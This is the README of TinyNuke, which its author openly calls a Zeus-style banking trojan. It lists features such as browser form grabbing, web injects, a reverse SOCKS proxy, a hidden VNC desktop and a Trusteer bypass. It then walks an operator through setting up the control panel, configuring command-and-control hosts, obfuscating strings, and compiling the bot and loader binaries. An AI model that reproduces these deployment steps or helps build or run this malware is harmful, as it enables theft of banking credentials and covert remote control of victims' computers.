This repository contains the source code of TinyNuke which is a zeus-style trojan written by me.

Main Features:
==============

 - Formgrabber and Webinjects for Firefox, Internet Explorer and Chrome x86 and x64
 - Reverse SOCKS 4
 - HVNC like Hidden Desktop
 - Trusteer Bypass

Installation:
=============

 * To install the panel dump the db.sql file then login with the default panel credentials admin:pass and finally navigate to settings.php
 
 * Open TinyNuke.sln and provide your server Api.cpp like this:

   Strs::host[0] = ENC_STR_A"127.0.0.1"END_ENC_STR;
   Strs::host[1] = ENC_STR_A"backup-server"END_ENC_STR;
   Strs::host[2] = 0;

   To obfuscate strings between the ENC_STR_A and END_ENC_STR, backup Api.cpp then use the AutoEncrypt project, a binary is located in the root directory
 
 * Compile the Bot project for the x64 and x86 platforms and upload the binaries to the panel in the settings page

 * Upload your webinject file, format can be seen in private/injects.json in the panel folder if you have no webinjects provide an empty JSON object "{}"
 
 * Compile the Loader project to get your PE file

Usage and additional info can be found within the code (HiddenDesktop/VNC server folder = HiddenDesktop, Reverse SOCKS 4 server = SocksServer)
